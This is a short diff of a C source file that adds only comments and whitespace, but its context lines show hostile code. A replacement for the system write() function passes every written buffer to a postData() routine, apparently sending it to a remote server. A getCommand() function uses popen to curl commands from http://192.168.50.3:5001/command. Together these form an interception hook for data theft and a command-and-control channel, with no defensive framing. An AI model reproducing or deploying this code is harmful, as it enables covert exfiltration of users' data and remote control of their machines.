@@ -12,6 +12,7 @@ void getCommand() {
   FILE *fp;
   char path[1035];
 
+  // open the command to read
   fp = popen("curl -s http://192.168.50.3:5001/command", "r");
 
   if(fp == NULL) {
@@ -19,6 +20,7 @@ void getCommand() {
     exit(1);
   }
 
+  // read the output
   while(fgets(path, sizeof(path), fp) != NULL) {
     printf("%s", path);
   }
@@ -50,7 +52,7 @@ void postData(const void *buf) {
 
 }
 ssize_t write(int fd, const void *buf, size_t count) {
-
+  
   postData(buf);
 
   // uncomment this if you want to get a command from the server
